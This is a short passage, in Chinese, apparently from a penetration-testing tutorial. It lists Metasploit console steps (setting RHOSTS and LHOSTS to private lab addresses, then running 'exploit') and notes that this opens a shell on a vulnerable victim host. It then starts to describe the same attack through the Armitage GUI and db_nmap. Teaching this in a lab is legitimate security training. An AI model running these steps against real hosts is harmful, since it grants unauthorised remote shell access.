    \ 连接\n- show options\n- set RHOSTS 10.0.0.2\n- set LHOSTS 10.0.0.4\n- show options\n\
    - exploit -- 这启动攻击并为你提供受害者主机的 shell 访问权限（如果主机存在漏洞）\n\n上述所有步骤也可以通过 Armitage（GUI\
    \ 界面）完成。\n\n要使用 Armitage 设置相同的攻击，你需要先运行 Armitage。从 \"Hosts\" 菜单中，你可以选择 `db_nmap`\
